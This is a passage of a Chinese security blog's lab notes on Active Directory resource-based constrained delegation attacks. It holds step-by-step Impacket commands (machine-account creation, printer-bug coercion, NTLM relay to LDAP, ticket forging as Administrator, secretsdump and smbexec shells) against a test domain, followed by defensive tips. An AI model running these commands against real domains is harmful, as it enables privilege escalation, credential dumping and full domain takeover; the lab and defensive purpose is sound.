+<li><strong>拥有一个可写目标计算机属性的账号</strong>：通常是<strong>将计算机加入域的用户</strong>（如 <code>hack</code> 将 <code>12server2</code> 加入域，则 <code>hack</code> 对 <code>12server2$</code> 有写权限），或者通过域内默认策略，任何域用户都可以创建最多10个机器账号，这些机器账号对自身有写权限（<code>NT AUTHORITY\SELF</code>）。</li>
+<li><strong>目标计算机</strong>：需要被攻击的机器，如域控 <code>DC1</code> 或成员服务器 <code>12server2</code>。攻击者可以修改其 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性。</li>
+<li><strong>有效的域凭据</strong>：用于添加机器账号和触发后续认证。</li>
+<li><strong>网络连通性</strong>：能够与域控和目标计算机通信。</li>
+</ul>
+<h4 id="11-3-2-准备工作：创建专用工作目录"><a href="#11-3-2-准备工作：创建专用工作目录" class="headerlink" title="11.3.2 准备工作：创建专用工作目录"></a>11.3.2 准备工作：创建专用工作目录</h4><p>建议在攻击机上创建一个目录（如 <code>~/impacket_output</code>）用于存放所有生成的票据和临时文件，避免污染 Impacket 脚本目录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> ~/impacket_output</span><br></pre></td></tr></table></figure>
+
+<h4 id="11-3-3-复现1：利用普通域账号提升到域本地管理员（攻击域控）"><a href="#11-3-3-复现1：利用普通域账号提升到域本地管理员（攻击域控）" class="headerlink" title="11.3.3 复现1：利用普通域账号提升到域本地管理员（攻击域控）"></a>11.3.3 复现1：利用普通域账号提升到域本地管理员（攻击域控）</h4><p>该复现结合打印机漏洞和 NTLM 中继，通过强制域控回连，修改域控的 RBCD 属性，进而获取域控权限。中继主机为攻击机（<code>192.168.18.100</code>）。</p>
+<p><strong>攻击流程图：</strong></p>
+<p><img src="/images/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%9F%9F%E6%83%85%E5%86%B5/image_8.png" alt="在这里插入图片描述"></p>
+<p><strong>步骤详细说明</strong>（所有命令在攻击机 Kali 上执行，假设 Impacket 脚本在 <code>~/impacket/examples/</code>）：</p>
+<ol>
+<li><p><strong>添加机器账号</strong>：使用 <code>addcomputer.py</code> 创建机器账号 <code>hack2026$</code>，密码 <code>pass@123</code>。  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 addcomputer.py -method SAMR -dc-ip 192.168.18.10 -computer-name hack2026 -computer-pass pass@123 <span class="string">&quot;redteam.club/hack:pass@123&quot;</span></span><br><span class="line"><span class="comment"># 参数说明：-method SAMR 使用 SAMR 协议添加，-computer-name 指定机器名（自动加$），-computer-pass 指定密码，最后是域用户凭据</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>启动 NTLM 中继</strong>：运行 <code>ntlmrelayx.py</code>，将认证中继到域控的 LDAP，并指定要提权的机器账号 <code>hack2026$</code>（注意 <code>$</code> 需要转义），同时使用 <code>-l</code> 指定输出目录为 <code>~/impacket_output</code>。  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlmrelayx.py -t ldap://192.168.18.10 -smb2support --remove-mic --delegate-access --escalate-user hack2026$ -l ~/impacket_output -debug</span><br><span class="line"><span class="comment"># -t：中继目标 LDAP 服务；--delegate-access：执行 RBCD 配置；--escalate-user：将 hack2026$ 的 SID 添加到目标计算机的 RBCD 列表；-l：指定输出目录（域信息文件将保存在这里）</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>触发打印机漏洞</strong>：运行 <code>printerbug.py</code>，强制域控 DC1 向攻击机（<code>192.168.18.100</code>）发起 SMB 认证。  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 printerbug.py redteam.club/hack:pass@123@192.168.18.10 192.168.18.100</span><br><span class="line"><span class="comment"># 第一个参数：域用户凭据@目标IP；第二个参数：攻击机IP（接收认证的机器）</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>中继修改 RBCD</strong>：域控的 SMB 连接被 <code>ntlmrelayx.py</code> 捕获并中继到 LDAP，从而将 <code>hack2026$</code> 的 SID 添加到域控计算机 <code>DC1$</code> 的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性中。</p>
+</li>
+<li><p><strong>请求机器账号 TGT</strong>：切换至专用工作目录，使用 <code>getTGT.py</code> 获取 <code>hack2026$</code> 的 TGT。  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/impacket_output   <span class="comment"># 进入专用目录</span></span><br><span class="line">python3 ~/impacket/examples/getTGT.py redteam.club/hack2026\$:pass@123 -dc-ip 192.168.18.10</span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=hack2026.ccache   <span class="comment"># 设置票据缓存环境变量（注意实际生成的文件名可能是 hack2026.ccache，不带$）</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>模拟域管理员请求服务票据</strong>：使用 <code>getST.py</code> 以 <code>hack2026$</code> 的身份模拟域管理员 <code>Administrator</code>，请求访问 <code>cifs/DC1.redteam.club</code> 的票据（ST2）。  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 ~/impacket/examples/getST.py -spn cifs/DC1.redteam.club -impersonate administrator -dc-ip 192.168.18.10 <span class="string">&quot;redteam.club/hack2026\$:pass@123&quot;</span></span><br><span class="line"><span class="comment"># -spn：目标服务的 SPN；-impersonate：要模拟的用户；最后是机器账号凭据（注意 $ 转义）</span></span><br><span class="line"><span class="comment"># 成功后会在当前目录生成 administrator.ccache 文件</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>访问域控</strong>：导出域哈希或获取 shell。  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator.ccache   <span class="comment"># 使用生成的 administrator 票据</span></span><br><span class="line">python3 ~/impacket/examples/secretsdump.py -k -no-pass DC1.redteam.club -just-dc-user administrator</span><br><span class="line"><span class="comment"># -k：使用 Kerberos 认证，-no-pass：不提供密码，-just-dc-user：只导出指定用户哈希</span></span><br><span class="line">python3 ~/impacket/examples/smbexec.py -no-pass -k DC1.redteam.club   <span class="comment"># 获取半交互式 shell</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="11-3-4-复现2：资源委派攻击其他域主机获取-system-权限"><a href="#11-3-4-复现2：资源委派攻击其他域主机获取-system-权限" class="headerlink" title="11.3.4 复现2：资源委派攻击其他域主机获取 system 权限"></a>11.3.4 复现2：资源委派攻击其他域主机获取 system 权限</h4><p>该复现针对普通成员服务器（如 <code>12server2</code>），通过查询创建者 SID，利用创建机器的用户权限配置 RBCD，进而获取该主机的 system 权限。</p>
+<p><strong>攻击流程图：</strong></p>
+<p><img src="/images/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%9F%9F%E6%83%85%E5%86%B5/image_9.png" alt="在这里插入图片描述"></p>
+<p><strong>步骤详细说明</strong>：</p>
+<ol>
+<li><p><strong>查询计算机创建者</strong>：使用工具（如 <code>ConsoleApp9.exe</code>）查询域内计算机的 <code>mS-DS-CreatorSID</code>，找到目标主机 <code>12server2</code> 的创建者为 <code>hack</code>。  </p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">hack</span>&gt;<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">hack</span>\<span class="title">ConsoleApp9.exe</span></span></span><br><span class="line"><span class="function">[*] [12<span class="title">server2.redteam.club</span>] -&gt; <span class="title">creator</span> [<span class="title">hack</span>]</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>添加机器账号</strong>：使用 <code>addcomputer.py</code> 创建机器账号 <code>hack$</code>，密码 <code>pass@123</code>（如果已有可用机器账号可跳过）。  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 addcomputer.py -method SAMR -dc-ip 192.168.18.10 -computer-name hack -computer-pass pass@123 <span class="string">&quot;redteam.club/hack:pass@123&quot;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>修改目标计算机的 RBCD 属性</strong>：使用 <code>rbcd.py</code> 将 <code>hack$</code> 的 SID 添加到 <code>12server2$</code> 的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性中。  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 ~/impacket/examples/rbcd.py -delegate-from hack$ -delegate-to 12server2$ -dc-ip 192.168.18.10 -action write <span class="string">&quot;redteam.club/hack:pass@123&quot;</span></span><br><span class="line"><span class="comment"># -delegate-from：发起委派的机器账号（hack$）；-delegate-to：目标计算机（12server2$）；-action write：写入属性</span></span><br></pre></td></tr></table></figure>
+<p>或使用 Windows 工具 <code>SharpAllowedToAct.exe</code>：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpAllowedToAct.exe -m hack -p pass@<span class="number">123</span> -t <span class="number">12</span>server2 -a <span class="number">192</span>.<span class="number">168</span>.<span class="number">18</span>.<span class="number">10</span> redteam.club</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>请求机器账号 TGT</strong>：获取 <code>hack$</code> 的 TGT。  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/impacket_output</span><br><span class="line">python3 ~/impacket/examples/getTGT.py redteam.club/hack\$:pass@123 -dc-ip 192.168.18.10</span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=hack.ccache</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>模拟域管理员请求服务票据</strong>：使用 <code>getST.py</code> 以 <code>hack$</code> 的身份模拟域管理员 <code>Administrator</code>，请求访问 <code>cifs/12server2.redteam.club</code> 的票据（ST2）。  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 ~/impacket/examples/getST.py -spn cifs/12server2.redteam.club -impersonate administrator -dc-ip 192.168.18.10 <span class="string">&quot;redteam.club/hack\$:pass@123&quot;</span></span><br><span class="line"><span class="comment"># 生成 administrator.ccache 票据</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>访问目标主机</strong>：获取 <code>12server2</code> 的 SYSTEM shell。  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator.ccache</span><br><span class="line">python3 ~/impacket/examples/smbexec.py -no-pass -k 12server2.redteam.club</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="11-3-5-注意事项"><a href="#11-3-5-注意事项" class="headerlink" title="11.3.5 注意事项"></a>11.3.5 注意事项</h4><ul>
+<li>复现1中，攻击者需要拥有一个普通域用户凭据（如 <code>hack:pass@123</code>），并确保域控的 Print Spooler 服务开启。</li>
+<li>复现2中，攻击者需要知道目标主机的创建者用户，并利用该用户的权限配置 RBCD。如果攻击者已控制创建者用户（如 <code>hack</code>），则可以直接操作。</li>
+<li>两个复现均依赖于默认的 <code>ms-DS-MachineAccountQuota</code>（允许域用户创建10个机器账号），若此配额为0，则无法添加机器账号。</li>
+<li>建议使用 <code>-l</code> 参数将 <code>ntlmrelayx.py</code> 生成的域信息文件重定向到专用目录，避免污染脚本目录。</li>
+<li>执行 <code>getTGT.py</code> 和 <code>getST.py</code> 前，务必先切换至工作目录（如 <code>~/impacket_output</code>），并通过 <code>export KRB5CCNAME</code> 正确设置票据缓存路径，以便后续工具自动读取。</li>
+</ul>
+<h3 id="11-4-攻击者视角与目标设定（基于当前环境）"><a href="#11-4-攻击者视角与目标设定（基于当前环境）" class="headerlink" title="11.4 攻击者视角与目标设定（基于当前环境）"></a>11.4 攻击者视角与目标设定（基于当前环境）</h3><p>在当前 REDTEAM 环境中，普通域用户 <code>hack</code> 具有添加计算机的权限，且对 <code>12server2</code> 拥有写权限（因为 <code>hack</code> 是将 <code>12server2</code> 加入域的用户）。攻击者可以利用这两个复现案例进行攻击。</p>
+<h4 id="11-4-1-攻击者假设掌握的信息"><a href="#11-4-1-攻击者假设掌握的信息" class="headerlink" title="11.4.1 攻击者假设掌握的信息"></a>11.4.1 攻击者假设掌握的信息</h4><ul>
+<li><strong>初始立足点</strong>：攻击者已获得一个普通域用户 <code>hack</code> 的密码（<code>pass@123</code>）。</li>
+<li><strong>目标</strong>：希望获取域控 <code>DC1</code> 的权限，或提升至域管理员，或控制其他成员服务器（如 <code>12server2</code>）。</li>
+<li><strong>写权限评估</strong>：通过 BloodHound 查询，确认 <code>hack</code> 对哪些计算机有写权限。已知 <code>hack</code> 对 <code>12server2</code> 有写权限；对于域控，需通过打印机漏洞中继来间接获得 RBCD 配置能力。</li>
+</ul>
+<h4 id="11-4-2-攻击切入点"><a href="#11-4-2-攻击切入点" class="headerlink" title="11.4.2 攻击切入点"></a>11.4.2 攻击切入点</h4><ul>
+<li><strong>复现1（攻击域控）</strong>：利用打印机漏洞强制域控回连，配合 NTLM 中继修改域控的 RBCD，然后模拟域管理员访问域控。</li>
+<li><strong>复现2（攻击成员服务器）</strong>：利用 <code>hack</code> 对 <code>12server2</code> 的写权限，直接配置 RBCD，模拟域管理员访问 <code>12server2</code>，获得该主机权限后，可进一步横向移动。</li>
+</ul>
+<h4 id="11-4-3-攻击者可达到的目的"><a href="#11-4-3-攻击者可达到的目的" class="headerlink" title="11.4.3 攻击者可达到的目的"></a>11.4.3 攻击者可达到的目的</h4><ul>
+<li><strong>短期目标</strong>：获得目标计算机（如 <code>12server2</code> 或域控）的服务访问权限，例如文件共享或 SYSTEM shell。</li>
+<li><strong>中期目标</strong>：若获得域控的 CIFS 访问权限，可进一步导出域哈希，进而制作黄金票据；若获得成员服务器权限，可进行横向移动，寻找提权路径。</li>
+<li><strong>最终目标</strong>：完全控制整个域环境。</li>
+</ul>
+<h3 id="11-5-防御提示"><a href="#11-5-防御提示" class="headerlink" title="11.5 防御提示"></a>11.5 防御提示</h3><ul>
+<li><strong>限制机器账号创建</strong>：降低 <code>ms-DS-MachineAccountQuota</code> 的值（默认为10），防止普通用户随意添加计算机。</li>
+<li><strong>保护高价值计算机</strong>：对域控等关键机器，严格控制其 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性的修改权限，仅允许域管理员修改。</li>
+<li><strong>监控异常 LDAP 修改</strong>：关注事件 ID 5136（目录服务对象被修改），特别是对 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 的更改。</li>
+<li><strong>禁用不必要的打印机服务</strong>：对于非打印服务器，关闭 Print Spooler 服务以防止打印机漏洞。</li>
+<li><strong>启用 Protected Users 组或设置“账户敏感且不能被委派”</strong>，防止高权限用户的凭据被滥用。</li>
+<li><strong>实施最小权限原则</strong>：定期审计域内用户的权限，特别是对计算机对象的写权限。</li>
+<li><strong>将域控制器等关键机器加入“受保护的用户”组，或设置“账户敏感且不能被委派”属性</strong>，以防止机器账户被用于委派攻击。</li>
+</ul>
+<hr>
+<h2 id="十二、总结"><a href="#十二、总结" class="headerlink" title="十二、总结"></a>十二、总结</h2><p>本笔记详细记录了 REDTEAM 域的当前环境，并深入讲解了 Kerberos 票据权限层级、SPN 与服务类型基础、非约束委派攻击（含结合 Spooler 漏洞）、约束委派攻击以及基于资源的约束委派攻击（含两个复现案例）。通过对委派机制的设计初衷、工作原理、攻击流程和防御措施的剖析，可以清晰地理解这些攻击在域环境中的利用方式和防护要点。</p>
+<p>实验环境中，12server1、12server2 配置了非约束委派，用户 web 配置了非约束委派，用户 websec 配置了约束委派，而普通用户 hack 可用于基于资源的约束委派攻击。这些配置为攻击者提供了多种提权路径，也凸显了正确配置委派和及时防御的重要性。掌握这些攻击手法，有助于提升对 Windows 域安全的认知，并有效进行渗透测试与防御部署。</p>
+
+		  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+
+		  <script>
+		    // 计算字数与阅读时长，同时更新阅读进度条
+		    (function() {
+		      var content = document.querySelector('.mypage');
+		      if (content) {
+		        var text = content.innerText || content.textContent;
+		        // 中文字符（含 CJK 扩展区 + 标点），按字符计数
+		        var chineseChars = (text.match(/[一-鿿㐀-䶿豈-﫿　-〿＀-￯]/g) || []).length;
+		        // 英文/数字按字符计（非词），与 CSDN 统计方式一致
+		        var latinChars = (text.match(/[a-zA-Z0-9]/g) || []).length;
+		        var wordCount = chineseChars + latinChars;
+		        // 阅读时长：中文约 300 字/分钟，英文约 200 词/分钟
+		        var englishWords = (text.match(/[a-zA-Z0-9]+/g) || []).length;
+		        var readingTime = Math.max(1, Math.ceil(chineseChars / 300 + englishWords / 200));
+		        var wcEl = document.getElementById('word-count');
+		        var rtEl = document.getElementById('reading-time');
+		        if (wcEl) wcEl.textContent = '~' + wordCount + ' 字';
+		        if (rtEl) rtEl.textContent = '约 ' + readingTime + ' 分钟';
+		      }
+		      // 阅读进度条
+		      var bar = document.getElementById('reading-progress-bar');
+		      if (bar) {
+		        window.addEventListener('scroll', function() {
+		          var scrollTop = window.pageYOffset || document.documentElement.scrollTop;
+		          var docHeight = document.documentElement.scrollHeight - window.innerHeight;
+		          var progress = docHeight > 0 ? Math.min(100, (scrollTop / docHeight) * 100) : 0;
+		          bar.style.width = progress + '%';
+		        });
+		      }
+		    })();
+		  </script>
+		</div>
+
+		
+		<span id="" class="leancloud-visitors view" data-flag-title="委派攻击域情况">
+			<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+		</span>
+		
+		
+		<div>
+	  	<center>
+
+		<div class="pagination">
+
+    
+    
+    <a href="/2026/03/23/BloodHound/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2026/03/13/内网渗透域情况/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+	    </center>
+		</div>
+
+		<!-- comment -->
+		
+			<section id="comments" class="comments">
+				<style>
+				.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+				@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+				</style>
+				<div id="vcomment" class="comment"></div>
+<script>
+// 延迟加载评论系统
+window.addEventListener('load', function() {
+  setTimeout(function() {
+    var script = document.createElement('script');
+    script.src = 'https://unpkg.com/valine@1.5.1/dist/Valine.min.js';
+    script.onload = function() {
+      var valineConfig = {"enable":true,"appId":"22F2XnoONZRtEbXvXO1SDcjS-gzGzoHsz","appKey":"bIFSRG6LeUO90VdfRBHUXNQs","placeholder":"说点什么吧~","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":true}
+      valineConfig.el = '#vcomment';
+      valineConfig.recordIP = true;
+      valineConfig.serverURLs = 'https://22f2xnoo.api.lncldglobal.com';
+      new Valine(valineConfig);
+    };
+    document.head.appendChild(script);
+  }, 1000); // 延迟1秒加载
+});
+</script>
+			</section>
+		
+		
+		
+		</div> <!-- col-md-9/col-md-12 -->
+
+
+		
+		<div id="side_meta">
+			<div class="col-md-3 sticky-meta" id="post_meta"> 
+
+	<!-- small fixed card (date + brief meta) -->
+	<div class="top-card">
+		<!-- date -->
+		
+		<div class="meta-widget">
+		<i class="fa fa-clock-o"></i>
+		2026-03-17
+		</div>
+		
+
+		<!-- brief categories/tags inside fixed card -->
+		
+		<div class="meta-widget small-cats">
+			<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>
+			<ul id="categorys" class="tag_box list-unstyled collapse in">
+				  
+  <li>
+    <li><a href="/categories/网络安全/">网络安全<span>35</span></a></li> <li><a href="/categories/网络安全/SRC-渗透/">SRC&渗透<span>7</span></a></li> <li><a href="/categories/网络安全/SRC-渗透/内网/">内网<span>3</span></a></li>
+  </li>
+
+			</ul>
+		</div>
+		
+
+		
+		<div class="meta-widget small-tags">
+			<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>
+			<ul id="tags" class="tag_box list-unstyled collapse in">
+				  
+  <li><a href="/tags/域渗透/">域渗透<span>2</span></a></li>
+			</ul>
+		</div>
+		
+	</div>
+
+	<!-- All Categories: sticky within sidebar area -->
+	<div class="category-stick" id="category-stick">
+		
+<div class="widget-wrap">
+  <h3 class="widget-title" style="font-family: monospace; font-size: 1.3em; font-weight: bold; color: #fff;">Categories</h3>
+  <div class="widget category-tree">
+    <ul class="hacker-category-list"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/408/">408</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/408/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a><span class="hacker-category-list-count">7</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/">CTF</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/">BUUCTF</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/PWN/">PWN</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/WEB/">WEB</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%9F%A5%E8%AF%86%E6%9D%82%E7%A2%8E/">知识杂碎</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/">Java</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/">python</a><span class="hacker-category-list-count">1</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><span class="hacker-category-list-count">35</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/">SRC&渗透</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/">内网</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E6%88%91%E7%9A%84SRC/">我的SRC</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E6%88%91%E7%9A%84SRC/%E6%80%9D%E8%B7%AF/">思路</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E6%88%91%E7%9A%84SRC/%E6%8A%A5%E5%91%8A/">报告</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a><span class="hacker-category-list-count">17</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Linux/">Linux</a><span class="hacker-category-list-count">4</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/windows/">windows</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%89%8D%E7%AB%AF/">前端</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%90%8E%E7%AB%AF/">后端</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E9%80%9A%E7%94%A8/">通用</a><span class="hacker-category-list-count">8</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/">漏洞</a><span class="hacker-category-list-count">11</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/PWN/">PWN</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB%E5%AE%89%E5%85%A8/">WEB安全</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB%E5%AE%89%E5%85%A8/Top10/">Top10</a><span class="hacker-category-list-count">7</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/%E5%A4%8D%E7%8E%B0/">复现</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E8%AF%81%E4%B9%A6/">证书</a><span class="hacker-category-list-count">1</span></li></ul>
+  </div>
+</div>
+
+
+<style>
+/* Hacker / Terminal Style Category Tree */
+.category-tree .hacker-category-list {
+  padding-left: 20px;
+  font-family: 'Consolas', 'Courier New', monospace;
+  color: #fff;
+  list-style-type: circle; /* 'o' bullet */
+}
+
+.category-tree .hacker-category-list .hacker-category-list {
+  list-style-type: square; /* '■' bullet */
+}
+
+.category-tree .hacker-category-list .hacker-category-list .hacker-category-list {
+  list-style-type: square;
+}
+
+.category-tree .hacker-category-list-item {
+  margin: 6px 0;
+}
+
+.category-tree .hacker-category-list-link {
+  background-color: rgba(43, 188, 138, 0.1);
+  color: #2bbc8a;
+  text-decoration: none;
+  padding: 1px 6px;
+  font-weight: bold;
+  display: inline-block;
+}
+
+.category-tree .hacker-category-list-link:hover {
+  background-color: rgba(43, 188, 138, 0.2);
+  text-decoration: none;
+}
+
+.category-tree .hacker-category-list-count {
+  color: #2bbc8a;
+  margin-left: 5px;
+}
+</style>
+	</div>
+
+	<!-- article TOC placed below the category list; should scroll with page -->
